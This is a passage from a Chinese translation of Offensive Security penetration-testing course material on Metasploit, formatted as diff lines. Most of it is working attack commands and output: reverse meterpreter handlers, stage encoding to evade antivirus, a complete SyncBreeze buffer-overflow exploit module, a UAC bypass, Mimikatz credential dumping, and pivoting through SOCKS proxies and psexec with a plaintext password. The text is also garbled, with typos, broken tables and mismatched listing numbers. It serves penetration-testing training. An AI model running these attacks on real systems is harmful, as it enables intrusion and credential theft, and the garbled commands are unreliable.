+当使用 `multi/handler` 模块时，我们必须指定传入的负载类型。在下面的示例中，我们将指示 `multi/handler` 期望并接收来自端口 443 监听器的 `windows/meterpreter/reverse_https` 负载。一旦第一阶段被 `multi/handler` 接收，第二阶段将传回目标机器。设置参数后，我们将运行 `exploit` 来让 multi-handler 监听。
+
+```
+msf > use multi/handler
+```
+
+```
+msf exploit(multi/handler) > set payload windows/meterpreter/reverse_https
+
+payload => windows/meterpreter/reverse_https
+```
+
+```
+msf exploit(multi/handler) > show options
+```
+
+
+
+### Module options (exploit/multi/handler):
+
+| Name | Current Setting | Required | Description |
+|---|---|---|---|
+| `EXITFUNC` | process | yes | Exit technique (Accepted: '', thread, process) |
+| `LHOST` |  | yes | The local listener hostname |
+| `LPORT` | 8443 | yes | The local listener port |
+| `LURI` |  | no | The HTTP Path |
+
+### Payload options (windows/meterpreter/reverse_https):
+
+| Name | Current Setting | Required | Description |
+|---|---|---|---|
+| `EXITFUNC` | process | yes | Exit technique (Accepted: '', thread, process) |
+| `LHOST` |  | yes | The local listener hostname |
+| `LPORT` | 8443 | yes | The local listener port |
+| `LURI` |  | no | The HTTP Path |
+
+### Exploit target:
+
+| Id | Name |
+|---|---|
+| 0 | Wildcard Target |
+
+```
+msf exploit(multi/handler) > set LHOST 10.11.0.4
+```
+`LHOST => 10.11.0.4`
+
+```
+msf exploit(multi/handler) > set LPORT 443
+```
+`PORT => 443`
+
+```
+msf exploit(multi/handler) > exploit
+```
+
+```
+[[*] Started HTTP reverse handler on http://10.11.0.4:443
+```
+
+> 列表 776 - 配置 Metploit `multi/handler`
+
+注意，在没有参数的情况下使用 **`exploit`** 命令会阻塞提示符直到执行。在大多数情况下，包含 `-j` 标志将模块作为后台作业运行更有帮助，允许我们在等待连接时继续其他工作。**`jobs`** 命令允许我们查看运行的后台作业。
+
+# 攻击安全
+www.offoffensivesecurity.com
+
+```
+msf5 exploit(multi/handler) > exploit -j
+```
+`[*] 漏洞利用正在作为后台任务 1 运行`
+
+`[*] 已在 https://10.11.0.4:443 启动 HTTP 反向处理程序`
+
+```
+msf5 exploit(multi/handler) > jobs
+```
+Jobs
+====
+
+| Id | Name | Payload | Payload opts |
+| --- | --- | --- | --- |
+| 0 | Exploit: multi/handler | windows/meterpreter/reverse_https | https://10.11.0.4:443 |
+
+```
+msf5 exploit(multi/handler) > jobs -i O
+```
+Name: Generic Handler, started at 2019-08-16 07:23:22 -0400
+
+```
+msf5 exploit(multi/handler) > kill 0
+```
+`[*] 正在停止任务(s): 0`
+`[*] 正在停止任务 0`
+
+```
+msf5 exploit(multi/handler) >
+```
+
+> 列出 777 - 作为后台任务执行 `multi/handler`
+
+当监听器作为任务运行时，我们可以使用 `-i` 标志后跟任务 ID 来显示其相关信息。此外，我们可以使用 `kill` 命令后跟任务 ID 来终止任务。
+
+此时，`multi/handler` 正在运行并监听 HTTPS 反向 payload 的连接。现在，我们可以生成一个包含 `windows/meterpreter/reverse_https` payload 的新可执行文件，在我们的 Windows 目标机器上执行它，我们的处理程序就会启动：
+
+```
+msf5 exploit(multi/handler) >
+```
+`[*] https://10.11.0.4:443 正在处理来自 10.11.0.22 的请求：正在分阶段 x86 payload`
+`[*] Meterpreter session 3 已打开 (10.11.0.4:443 -> 10.11.0.22:512528)`
+
+```
+msf5 exploit(multi/handler) >
+```
+
+> 列出 778 - 使用 `multi/handler` 接受反向 meterpreter
+
+如果我们在连接建立时监控网络流量，将会发现它看起来与任何其他 HTTPS 连接一样，这可能规避基础检测。
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+| Source | Destination | Protocol | Len? |
+| --- | --- | --- | --- |
+| 10.10.1.4 | 10.11.02.2 | TLSv1 | 139 Application Data |
+| 10.10.1.4 | 10.11.02.2 | TLSv1 | 139 Application Data |
+| 10.10.1.4 | 10.11.02.2 | TLSv1 | 139 Application Data |
+| 10.10.1.4 | 10.11.02.2 | TCP | 54 48398 - 3389 Seq=2211 Ack=8256 Win=1219 Len=0 |
+| 10.10.1.4 | 10.11.02.2 | TLSv1 | 139 Application Data |
+| 10.10.1.4 | 10.11.02.2 | TLSv1 | 139 Application Data |
+| 10.10.1.4 | 10.11.02.2 | TLSv1 | 139 Application Data |
+| 10.10.1.4 | 10.11.02.2 | TLSv1 | 139 Application Data |
+| 10.10.1.4 | 10.11.02.2 | TLSv1 | 139 Application Data |
+| 10.10.1.4 | 10.11.02.2 | TCP | 54 48398 - 3389 Ack=16517 Win=12619 Len=0 |
+| 10.10.1.4 | 10.11.02.2 | TCP | 54 48398 - 3389 [ACK] Seq=2891 Ack=41071 Win=1529 Len=0 |
+| 10.10.1.4 | 10.11.02.2 | TLSv1 | 139 Application Data |
+| 10.10.1.4 | 10.11.02.2 | TCP | 54 48398 - 3389 Seq=3061 Ack=53172 Win=12597 Len=0 |
+| 10.10.1.4 | 10.11.02.2 | TCP | 54 48398 - 3389 [ACK] Seq=3061 Ack=65273 Win=12597 Len=0 |
+| 10.10.1.4 | 10.11.02.2 | TCP | 54 48398 - 3389 Seq=3061 Ack=77374 Win=12597 Len=0 |
+| 10.10.1.4 | 10.11.02.2 | TCP | 54 48398 - 3389 Seq=3061 Ack=91833 Win=12597 Len=0 |
+| 10.10.1.4 | 10.11.02.2 | TCP | 54 48398 - 3389 Ack=112045 Win=1552 Len=0 |
+| 10.10.1.4 | 10.11.02.2 | TCP | 54 48398 - 3389 [ACK] Seq=3061 Ack=126218 Win=12589 Len=0 |
+| 10.10.1.4 | 10.11.02.2 | TCP | 54 48398 - 3389 [ACK] Seq=3061 Ack=133415 Win=12592 Len=0 |
+
+# 客户端攻击
+
+Metasploit Framework 提供了许多辅助客户端攻击的功能，包括我们已经探索过的各种可执行格式。我们使用 `-l` 格式查看这些可执行文件。
+
+```
+kali@kali~$ msfvenom -l
+```
+Framework Executable Name
+
+- asp
+- aspx
+- dll
+- elf
+- exe
+- hta
+- vba
+- bash
+
+
+
+> 列出 779 - msfvenom 的可用格式
+
+`hta`、`vba` 和 `bash` 格式旨在通过创建恶意的 HTML、Office Word 或 Excel 文档进行客户端攻击。MSF 包含了许多浏览器漏洞。例如，我们可以搜索 "flash" 来显示列出 780 所示的基于 Flash 的漏洞。
+
+```
+msf5 > search flash
+```
+
+...
+
+`exploit/multi/browser/adobe_flash_hacking_team_uaf` ByteArray After Free 2015-07-06
+
+`exploit/multi/browser/adobe_flash_nellymos_bof` Flash Player Nellymos Buffer Overflow 2015-06-23
+
+`exploit/multi/browser/adobe_flash_net_connection_confusion` Flash Player Connection Type 2015-03-12
+
+`exploit/multi/browser/adobe_flash_opaque_background_waf` OpaqueBackground Use After Free 2015-07-06
+
+`exploit/multi/browser/adobe_flash_pixel_bender_bof` Flash Shader Buffer Overflow 2014-04-28
+
+`exploit/multi/browser/adobe_flash_shader_drawing_file` Shader Filling Memory Corruption 2015-05-12
+
+`exploit/multi/browser/adobe_flash_shader_job_overflow` ShaderJob Buffer Overflow 2015-05-12
+
+`exploit/multi/browser/adobe_flash_uncompress_zib_waf` ByteArray UncompressZibVariant After Free 2014-04-28
+
+> 列出 780 - Metasploit 中的 Adobe Flash 漏洞
+
+虽然漏洞是最稳定，但由于浏览器漏洞开发的挑战增加，也面临困难。如果我们发现目标运行着没有补丁的 Windows 7，这种类型的代理可能提供我们需要的突破口。
+
+# 高级功能与传输
+
+了解 Metasploit Framework 和 payload 的基本功能后，我们可以创建更高级的选项，可以通过 `show advanced` 命令显示它们。让我们探索一个比较有趣的选项。
+
+```
+msf5 exploit(multi/handler) > show advanced
+```
+
+| Name Exploit Current Setting Required Description |
+|---|---|---|---|
+| ContextInformationFile false no | 包含信息的文件 |
+| DisablePayloadHandler false no | 禁用会话的处理程序代码 |
+| EnableContextEncoding false no | 编码时使用瞬态上下文 |
+| ExitOnSession true yes | 会话后从漏洞利用中返回 |
+| ListenerTimeout 0 no | 等待的最大秒数 |
+| VERBOSE false no | 启用详细状态消息 |
+| WORKSPACE false no | 指定此模块的工作空间 |
+| Timeout 0 no | 等待连接时的额外延迟 |
+
+Payload 高级选项 (`windows/meterpreter/reverse_https`):
+
+| Name Current Setting Required Description |
+|---|---|---|
+| AutoLoadStdpi true yes | 自动加载 Stdpi 扩展 |
+| AutoRunScript false no | 会话上自动运行的脚本 |
+| AutoSystemInfo true yes | 自动获取系统信息 |
+| AutoHookProcess false yes | 自动卸载 hook 扩展 |
+
+> 列出 781 - multi/handler 的高级选项
+
+首先，让我们来看一些高级编码选项。在之前的示例中，我们选择对放入漏洞利用中的第一阶段 shellcode 进行编码。由于 Meterpreter payload 的第二阶段大得多并且包含更多潜在签名，它可能会被各种杀病毒解决方案标记，因此我们可能选择对第二阶段也进行编码。
+
+我们可以使用 `EnableStageEncoding` 配合 `StageEncoder` 对第二阶段进行编码以绕过检测。为此，我们将 `EnableStageEncoding` 设置为 'true'并将 `StageEncoder` 设置为我们选择的 "x86/shikata_ga"。
+
+```
+msf5 exploit(multi/handler) > set EnableStageEncoding true
+EnableStageEncoding => true
+
+msf5 exploit(multi/handler) > set StageEncoder x86/shikata_ga
+StageEncoder => x86/shikata_ga
+```
+
+```
+msf5 exploit(multi/handler) > exploit -j
+[*] 漏洞利用正在作为后台任务 2 运行
+
+msf5 exploit(multi/handler) >
+[*] 10.11.0.4:443 正在处理来自 10.11.0.22 的请求：使用 x86/shikata_ga 编码的阶段
+[*] 10.11.0.4:443 正在处理来自 10.11.0.22 的请求：分阶段 x86 payload (18085)
+[*] Meterpreter session 4 已打开 (10.11.0.4:443 -> 10.11.0.22:512275)
+```
+
+```
+msf5 exploit(multi/handler) >
+```
+
+`AutoRunScript` 也有帮助，因为它会在 meterpreter 连接建立时自动运行脚本。这在客户端攻击中非常有用，因为当用户执行我们的 payload 时我们可能不在，例如，我们可以配置 `gather/enum_logged_on_users` 模块在 meterpreter 连接时自动枚举登录用户：
+
+```
+msf5 exploit(multi/handler) > set AutoRunScript windows/gather/enum_logged_on_users
+AutoRunScript => windows/gather/enum_logged_on_users
+```
+
+```
+msf5 exploit(multi/handler) > exploit -j
+[*] 漏洞利用正在作为后台任务 3 运行
+
+msf5 exploit(multi/handler) >
+[*] 10.11.0.4:443 正在处理来自 10.11.0.22 的请求：分阶段 x86 payload (18082)
+[*] Meterpreter session 5 已打开 (10.11.0.4:443 -> 10.11.0.22:512275)
+[*] Session ID 5 (10.11.0.4:443 -> 10.11.0.22:512275) 正在 AutoRunScript 'windows/gather/enum_logged_on_users'
+[*] 正在针对 session 5
+```
+
+```
+当前登录用户
+================
+```
+
+| SID | User |
+
+|---|---|
+
+# OFFENSIVE SECURITY
+
+www.offensive-security.com
+
+基于 Kali Linux 的渗透测试 2.0
+
+```
+---
+S-5-21-304885246-3234708-708-72345274-1103 corp|offsec
+S-5-21-3426091779-1881636637-194462440-1001 CLIENT21\admin
+---
+```
+
+> 列表 738 - Meterpreter 在会话创建时执行模块
+
+到为止，我们已经使用各种内置命令导航了 meterpreter 会话，但我们也可以临时退出 meterpreter，在 Metasploit Framework 内部执行其他操作，而无需关闭连接。我们可以使用 `background` 返回 msconsole 提示符，在其中可以在框架内执行其他操作。当我们准备返回 meterpreter 会话时，可以使用 `sessions -l` 列出所有可用的会话，并使用 `sessions -i` (interact) 后接相应的 ID 跳回我们的会话，如列表 784 所示。
+
+
+
+```
+meterpreter > background
+[*] Backgrounding session 5...
+mfs5 exploit(multi/handler) > sessions -l
+
+Active sessions
+====================
+```
+
+| Id | Name Type | Information | Connection |
+|---|---|---|---|
+| 5 | meterpreter x86/windows | NT AUTHORITY\SYSTEM @ WIN10.0:X86 | 10.11.0.4:4444 -> 10.11.0.22:50834 (10.11.0.22) |
+
+```
+mfs5 exploit(multi/handler) > sessions -i 5
+[*] Starting interaction with 5...
+meterpreter >
+```
+
+> 列表 784 - 在 Metasploit Framework 中切换会话
+
+使用这些命令，我们可以在不同的受控主机上的可用 shell 之间切换，而无需关闭任何连接。
+
+在之前的示例中，我们使用了一个预定义的通信协议（如 TCP 或 HTTPS）来攻击目标，这是我们在生成有效 payload 时选择的。我们可以在初始攻破后使用 Meterpreter 传输（transports）来切换协议。我们可以通过 `transport list` 限制 meterpreter 连接当前可用的传输通道。
+
+```
+meterpreter > transport list
+Session Expiry : @ 2019-10-09 17:01:44
+
+ID Curr URL
+1 * http://10.11.0.4:4444/gFojKgv3fBaA1MHmVpPUgws_f66dXGrl8ZbbZTTkkyCuJfFeAaDK/
+```
+
+> 列表 785 - 初始传输
+
+716 (Rapid7, 2016), https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Transport-Control
+
+PWK 2.0 © Offensive Security Ltd. 保留所有权利 704
+
+# OFFENSIVE SECURITY
+
+基于 Kali Linux 的渗透测试 2.0
+
+我们还可以使用 `transport add` 为当前会话添加传输协议，使用 `-t` 设置所需的传输类型。
+
+在下例示例中，我们将添加 `reverse_tcp` 传输，这等同于选择 `windows/meterpreter/reverse_tcp` payload。我们将允许指定指定传输类型的选项，包括本地主机 IP 地址 `-l` 和本地端口 `-p`：
+
+```
+meterpreter > transport add -t reverse_tcp -l 10.11.0.4 -p 5555
+[*] Adding new transport ...n
+[*] Successfully added reverse_tcp transport.
+```
+
+```
+meterpreter > transport list
+Session Expiry : 2019-10-09 17:01:44
+```
+
+| ID | Curr | URL |
+|---|---|---|
+| 1 | * | http://10.11.0.4:4444/gFokgv3Qba1MHVmlplUgXws-f66dGRl8ZbQQZtkKyCuJfFaeAaDK/tcp://10.11.0.4:5552 |
+
+列表 786 -向 meterpreter 会话添加新传输
+
+在使用新传输之前，我们必须设置一个监听器（listener）来捕捉连接。我们将再次使用 `multi/handler` 模块并指定我们选择的参数来完成此操作。
+
+配置好 handler 后，我们可以返回 meterpreter 会话，并在新创建的操作旁边运行 transport。这将创建一个新会话并关闭旧会话。
+
+```
+meterpreter > background
+[*] Background session 5...
+msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set LHOST 10.11.0.4
+LHOST => 10.11.0.4
+msf5 exploit(multi/handler) > set LPORT 5555
+LPORT => 5555
+msf5 exploit(multi/handler) > exploit -j
+[*] Exploit running as background job 0.
+Started reverse tcp TCP handler on 10.11.0.4:5555
+msf5 exploit(multi/handler) > sessions -i 5
+Interaction with 5...
+[*] Starting interaction...
+meterpreter > background
+[*] Background session 5...
+```
+
+*(注：原文后部分存在大量重复的命令块，已根据逻辑流进行清理处理)*
+
+# 攻击性安全
+
+我们将像原始利用程序一样，使用 `/login` URL 通过 HTTP POST 请求发送构造的恶意字符串。我们将使用利用策略来处理 HTTP POST 的 `username`：
+
+```python
+def exploit
+  print_status("Generating exploit...")
+  exp = rand_text_alpha(target['offset'])
+  exp << [target.ret].pack('V')
+  exp << rand_text(4)
+  exp << make_nops(10) # NOP sled 确保我们能跳转到指向 shellcode 的 jmp
+  exp << payload.encoded
+```
+
+```python
+print_status("Sending exploit...")
+
+send_request_cgi(
+  'uri' => '/login/',
+  'method' => 'POST',
+  'connection' => 'keep-alive',
+  'vars_post' => {
+    'username' => "#{exp}",
+    'password' => "fakespw"
+  }
+)
+```
+
+```
+handler
+disconnect
+```
+
+将所有部分组合在一起，我们就得到了一个针对 SyncBreeze Enterprise 漏洞的完整 Metasploit 利用模块。
+
+> 列表 792 - Metasploit 模块的利用函数
+
+```ruby
+##
+# 此模块需要 Metasploit: http://metasploit.com/download
+# 当前源码: https://github.com/rapid17/metasploit-framework
+##
+```
+
+
+
+# SyncBreeze Buffer Overflow
+
+```ruby
+class MetasploitModule < Mf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Mf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(
+      'Name'        => "SyncBreeze Buffer Overflow",
+      'Description' => "%Q\n    此模块将你针对 SyncBreeze Enterprise 10.0.28 的 python 利用程序端口到 MSF。
+      'License'     => MSF_LICENSE,
+      'Author'      => ['Offensive Security', 'offsec'],
+      'References'  => [
+        ['EDB', '42886']
+      ],
+      'DefaultOptions' =>
+    [
+  ]))
+```
+
+```ruby
+'EXITFUNC' => 'thread'
+
+'Platform' => 'win',
+'Payload' => {
+  'BadChars' => '\\x00\x0d\x0a\x25\x26\x2b\x3d',
+  'Space' => 500,
+  'Targets' => {
+    'SyncBreeze Enterprise 10.0.28',
+    'Ret' => 0x010090c3, # JSP ESP msvapi.dll
+    'Offset' => 780
+  }
+}
+'Privileged' => true,
+'DisclosureDate' => 'Oct 20 2019',
+'DefaultTarget' => 0)
+```
+
+`register_options([Opt::RPORT(80)])`
+
+```ruby
+def check
+  res = send_request_cgi(
+    'uri' => '/',
+    'method' => 'GET'
+  )
+```
+
+```ruby
+if res && res.code == 200
+  product_name = res.body.scan((Sync Breeze Enterprise v[^d]*)/i).flatten.first
+  if product_name =~ /10\./
+    return Exploit::CheckCode::Appears
+```
+
+```ruby
+  end
+end
+
+return Exploit::CheckCode::Safe
+
+end
+```
+
+```ruby
+def exploit
+  print_status("Generating exploit...")
+  exp = rand_text_alpha(target['Offset'])
+  exp << [target.ret].pack('V')
+  exp << rand_text(4)
+  exp << make_nops(10) # NOP sled 确保我们能跳转到指向 shellcode 的 jump
+  exp << payload.encoded
+```
+
+```ruby
+print_status("Sending exploit...")
+send_request_cgi(
+  'uri' => '/login',
+  'method' => 'POST',
+  'connection' => 'keep-alive',
+  'vars_post' => {
+    'username' => '#{exp}',
+    'password' => 'fakepsw'
+  })
+```
+
+```
+handler
+disconnect
+end
+```
+
+`kali@kali:~ sudo msfconsole -q`
+
+[*] Starting persistent handler(s)...
+
+```bash
+msf5 > search syncbreeze
+Matching Modules
+======================
+```
+
+| Name | Disclosure Date | Rank | Check | Description |
+
+|---|---|---|---|---|
+
+| exploit/windows/fileformat/syncbreeze_xml | 2017-03-29 | normal | No | SyncBreeze Enterprise 9.5.16 - Import Command Buffer Overflow |
+
+| exploit/windows/http/syncbreeze | 2019-10-20 | excellent | Yes | SyncBreeze Enterprise Buffer Overflow |
+
+| exploit/windows/http/syncbreeze_bof | 2017-03-15 | great | Yes | SyncBreeze Enterprise 10.0.28 - Import Command Buffer Overflow | |
+
+```bash
+msf5 > use exploit/windows/http/syncbreeze
+msf5 > exploit(windows/http/syncbreeze) >
+```
+
+我们注意到 `syncbreeze` 现在包含三个结果，第二个是是我们自定义的利用程序。接下来我们将选择一个负载，设置参数并进行漏洞检查。
+
+```bash
+msf5 exploit(windows/http/syncbreeze) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/shell/reverse_tcp
+msf5 exploit(windows/http/syncbreeze) > set RHOST 10.11.0.22
+RHOST => 10.11.0.22
+msf5 exploit(windows/http/syncbreeze) > set LHOST 10.11.0.24
+LHOST => 10.11.0.24
+msf5 exploit(windows/http/syncbreeze) > check
+[*] 10.11.0.22:80 - The target appears to be vulnerable.
+```
+
+最后，我们启动利用程序来获取反向 shell。
+
+```bash
+msf5 exploit(windows/http/syncbreeze/syncbreeze) > exploit
++ Started reverse TCP handler on 10.11.0.4:4444
+* Generating exploit...
+* Sending exploit...
+* Sending stage (17999 bytes) to 10.11.0.22
+* Meterpreter session opened (10.11.0.4:4444) -> 10.11.0.4:4444
+meterpreter > getuid
+当前为 SYSTEM
+meterpreter >
+```
+
+# 使用 Kali Linux 进行渗透测试 2.0
+
+运行漏洞利用本质上是将漏洞利用通过活动会话传输到漏洞主机：
+
+```bash
+msf5 > use exploit/windows/local/bypassuac_injection_winsxs
+```
+
+```bash
+msf5 exploit(windows/local/bypassuac_injection_winsxs) > show_options
+```
+
+模块选项 (`exploit/windows/local/bypassuac_injection_winsxs`):
+
+| Name | Current Setting | Required | Description |
+
+|---|---|---|---|
+
+| SESSION | | yes | 在此会话上运行该模块。 |
+
+漏洞目标：
+
+| Id | Name |
+
+|---|--|
+
+| 0 | Windows x86 |
+
+```bash
+msf5 exploit(windows/local/bypassuac_injection_winsxs) > set SESSION 10
+SESSION => 10
+```
+
+```bash
+msf5 exploit(windows/local/bypassuac_injection_winsxs) > exploit
+```
+
+- [+] 在 10.11.0:4444 上开启了反向 Tcp 处理器
+
+- [+] Windows 10 (Build 1629)，可能存在漏洞。
+
+- [+] UAC 已启用，正在检查级别...
+
+- [+] 属于 Administrators 组！继续...
+
+
+
+- [+] UAC 已设为默认值。
+
+- [+] ByUAC 可以绕过此设置，继续...
+
+- [+] 正在创建文件夹...
+
+- [+] 正在将 DLL 上传到文件系统...
+
+- [+] 启动带有 Windows 发布证书的进程以注入...
+
+- [+] 成功在进程中注入负载: 5800
+
+- [+] 向 10.11.0.22 发送阶段 (179779)
+
+- [+] Meterpreter 会话 11 打开 (10.11.0.4:4444 -> 10.11.0.22:53870)
+
+```
+meterpreter >
+```
+
+> 列表 800 - 使用 meterpreter 会话执行 UAC 绕过
+
+除了能够后台活动会话并通过它执行模块外，我们还可以使用 `load` 命令直接在活动会话内部加载扩展。
+
+其中一个很好的例子是 PowerShell 扩展，⁷¹²，它允许使用 PowerShell。通过此模块，我们可以执行 PowerShell 命令和脚本，或者启动交互式 PowerShell 命令。在列表 801 中，我们加载了 `powershell` 并列出了可子命令。
+
+```
+meterpreter > load powershell
+Loading extension powershell...Success.
+```
+
+⁷¹²(Carlos Perez, 2016), https://www.darkoper.com/blog/2016/4/2/meterpreter-new-windows-powershell-extension
+
+# 使用 Kali Linux 进行渗透测试 2.0
+
+```
+meterpreter > help powershell
+```
+
+PowerShell 命令
+
+====
+
+| Command | Description |
+| --- | --- |
+| powershell_execute | 执行 PowerShell 命令字符串 |
+| powershell_import | 导入 PS 脚本或 .NET 程序集 DLL |
+| powershell_shell | 创建交互式 PowerShell 提示符 |
+
+例如，让我们使用 `powershell_execute` 命令通过 `$PSVersionTable.PSVersion` 全局变量来获取 PowerShell 版本。
+
+```
+meterpreter > powershell_execute "$PSVersionTable.PSVersion"
+[+] Command execution completed:
+```
+
+| Major | Minor | Build | Revision |
+| --- | --- | --- | --- |
+| 5 | 1 | 16299 | 248 |
+
+> meterpreter > 列表 802 - 执行 PowerShell 命令
+
+Mimikatz 同样非常有用且幸运，它是一个扩展的实现。在这个示例中，我们将使用 `load kiwi` 运行该扩展。由于 Mimikatz 需要 SYSTEM 权限，我们将运行 `getsystem` 以从我们当前的高完整性 shell（在攻击者的上下文中）自动获取 SYSTEM 权限。最后，我们将使用 `creds_msv` 导出系统凭据：
+
+```
+meterpreter > load kiwi
+Loading extension kiwi...
+```
+
+Success.
+
+```
+meterpreter > getsystem
+```
+
+...got system technique 1 (Named Pipe/Memory)).
+
+```
+meterpreter > creds_msv
+[+] Running as SYSTEM
+[+] Retrieving credentials
+====
+
+| Username | Domain | SHA1 |
+| --- | --- | --- |
+| CLIENT$ | corp | NTLM 4d4ae0e7cb61dc4fe6941ab3d80ed45264396231ca74ac2dff7580 |
+| abdf154 | e2b475c11da2a784290d8a996c3277f430e84acb10eead38d6401 | 6400d2e16c264a7b63c4e67bbef4ae |
+
+Security Ltd. All rights reserved.
+
+# 使用 Kali Linux 2.0 进行渗透
+
+## 2.5 使用 Metasploit Framework 进行渗透
+
+在渗透目标后，我们可以从系统渗透到额外的目标。在 MSF 内进行渗透很方便，但缺乏手动灵活性。例如，让我们利用现有的 Meterpreter 会话枚举内部网络并渗透到其他机器。首先，我们注意到被渗透的客户端有两个接口：
+
+```
+C:\Users\offsec>ipconfig
+
+Windows IP Configuration
+
+Ethernet adapter Ethernet1:
+
+    Connection-specific Suffix   . . . : fe80::49e9:5c0:6600
+
+    Link-local IPv6 Address . . . . . . : fe80::49e9:5c0:6600
+
+    IPv4 Address . . . . . . . . : 192.168.1.11
+
+    Subnet Mask . . . . . . . . . . . . . : 255.255.255.0
+
+    Default Gateway . . . . . . . . . . . . . : 192.168.1
+
+Ethernet adapter Ethernet0:
+
+    Connection-specific Suffix   . . . : 10.11.0.22
+
+    IPv4 Address . . . . . . . . . . . . . . : 10.11.0.22
+
+    Subnet Mask . . . . . . . . . . . . . . . . : 255.255.255.0
+
+    Default Gateway . . . . . . . . . . . . . . : 10.11.0.2
+
+C:\Users\offsec>
+```
+
+## 列表 804 - 被渗透客户端上的双接口
+
+我们将使用 `route` 和 `add` 为发现的备用内网创建路径。我们还将指定该路由适用于会话 ID。
+
+```
+msf5 > route add 192.168.1.0/24 11
+[*] Route added
+
+msf5 > route print
+
+IPv4 Active Routing Table
+
+=========================
+
+Subnet          Netmask          Gateway
+
+-------------  ----------  -------
+
+192.168.1.0     255.255.255.0
+```
+
+## 列表 805 - 添加新路由
+
+有了内部路径，我们可以枚举此子网。由于我们已经知道了域控制器的 IP 地址，我们将使用 `portscan/tcp` 模块对其进行有限端口扫描。
+
+```
+msf5 > use auxiliary/scanner/portscan/tcp
+msf5 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.110
+RHOSTS => 192.168.1.110
+msf5 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389
+PORTS => 445,3389
+msf5 auxiliary(scanner/portscan/tcp) > run
+msf5 192.168.1.110:
+[+] 192.168.1.110:3389 - TCP OPEN
+[+] 192.168.1.110:445 - TCP OPEN
+[+] 192.168.1.110 - Scanned 1 of 1 hosts (100% complete)
+[+] Auxiliary module execution completed
+msf5 auxiliary(scanner/portscan/tcp) >
+```
+
+## 列表 806 - 对内部 IP 地址进行端口扫描
+
+由于我们之前明智地验证了域控制器的管理员凭据，现在我们尝试通过 `smb/psexec` 模块渗透域控制器。我们需要通过如下所示设置 `SMBDomain`、`SMBUser` 和 `SMBPass` 的值来指定凭据。
+
+```
+msf5 > use exploit/windows/smb/psexec
+msf5 exploit(windows/smb/psexec) > set SMBDomain corp
+SMBDomain => corp
+```
+
+
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+```
+msf5 exploit(windows/smb/psexec) > set SMBUser jeff_admin
+SMBUser => jeff_admin
+
+msf5 exploit(windows/smb/psexec) > set SMBPass Qerty9!
+SMBPass => Qerty9!
+
+msf5 exploit(windows/smb/psexec) > set RHOSTS 192.168.1.110
+RHOSTS => 192.168.1.110
+
+msf5 exploit(windows/smb/psexec) > set LPORT 444
+LPORT => 444
+
+msf5 exploit(windows/smb/psexec) > exploit
+[+] 192.168.1.110:3389 - TCP OPEN
+[+] 192.168.1.110:445 - TCP OPEN
+```
+
+[+] Post module execution completed
+
+```
+msf5 post(multi/manager/autoroute) >
+```
+
+> 列表 808 - 调用 `autoroute` 模块
+
+我们还可以将路由与 `server/socks4a` 结合以配置 SOCKS 代理。这允许 Metasploit Framework 之外的应用程序通过它进行隧道传输。为此，我们首先将模块设置为本地主机：
+
+```
+msf5 post(multi/manager/autoroute) > use auxiliary/server/socks4a
+```
+
+```
+msf5 auxiliary(server/socks4a) > show options
+```
+
+模块选项 (`auxiliary/server/socks4a`):
+
+| 名字 | 当前设置 | 是否 | 描述 |
+| :--- | :--- | :--- | :--- |
+| SRVHOST | 0.0.0.0 | yes | 监听的地址 |
+| SRVPORT | 1080 | yes | 监听的端口。 |
+
+辅助动作：
+
+| 名字 | 描述 |
+| :--- | :--- |
+| Proxy | |
+
+```
+msf5 auxiliary(server/socks4a) > set SRVHOST 127.0.0.1
+SRVHOST => 127.0.0.1
+```
+
+```
+msf5 auxiliary(server/socks4a) > exploit -j
+[*] Auxiliary module running as background 0.
+```
+
+[+] Starting the socks4a proxy server
+
+> 列表 809 - 使用 `autoroute` 设置 SOCKS 代理
+
+现在我们可以使用 Proxchains 配置文件 (`/etc/proxychains.conf`) 来利用 SOCKS 代理。这是通过添加如列表 810 所示的配置行来实现：
+
+```
+kali@kali:~ sudo echo socks4 127.0.0.1:1080 >> /etc/proxychains.conf
+```
+
+> 列表 810 - 配置 Proxychains 使用正确的端口
+
+最后，我们可以使用 `proxychains` 运行类似 `rdesktop` 等应用程序，从我们的 Kali 系统获取对内部网络域控制器的 GUI 访问。
+
+```
+kali@kali:~ sudo proxychains rdesktop 192.168.1.110
+Proxychains-3.1 (http://proxychains.sf)
+Autselected proxy map-en
+[S-chain1]->127.0.0.1:1080->192.168.1.110:3389-><S-chain]->OK
+ERROR: <credSSP> initialization failed, do you kerberos tgt initialized ?
+[S-chain]->127.0.0.1:1080->192.168.1.110:3389-><S-chain]->OK
+Connection established using SSL
+WARNING: Remote desktop does not support color depth 24; falling back to 16
+```
+
+> 列表 811 - 获取内部网络的远程访问
+
+## 攻击性安全
+使用 Kali Linux 2.0 进行渗透测试
+
+接下来，`rdesktop` 客户端打开并允许我们如图 315 所示登录域控制器：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_719_0.png)
+
+图 315 从 Kali Linux 到内部网络的远程桌面访问
+
+我们还可以从 `meterpreter` 会话内部使用 `portwd` 命令使用类似的端口转发技术，这将一个特定端口转发到内部网络。
+
+```
+meterpreter > portwd -h
+Usage: portwd [-h] | [ delete | list | flush ] [args]
+```
+
+- 选项：
+- L <opt> 转发：要监听的本地主机（可选）。反向：连接的本地主机
+- R 表示反向端口转发。
+- -h 帮助。
+- i <opt> 用于交互的端口转发索引（参见 "list" 命令）
+- l <opt> 转发：监听的本地端口。反向：连接的本地端口。
+- p <opt> 转发：连接的远程端口。反向：监听的远程端口。
+- r <opt> 转发：连接的远程主机。
+
+> 列表 812 - `portwd` 命令选项
+
+我们可以创建一个从 `localhost` 端口 `3389` 到受攻击主机 (`192.168.1.110`) 的端口转发，如列表 813 所示：
+
+```
+meterpreter > portwd add -l 3389 -p 3389 -r 192.168.1.110
+[*] TCP relay created: :3389 <=> 192.168.1.110
+```
+
+> 列表 813 - 端口转发设置
+
+![](img/f99f528ca9845f4c256ce54e882b1345_720_0.png)
+
+让我们通过 `rdesktop` 连接到 `127.0.0.1:3389` 来测试访问内部网络中的受攻击主机。
+
+```
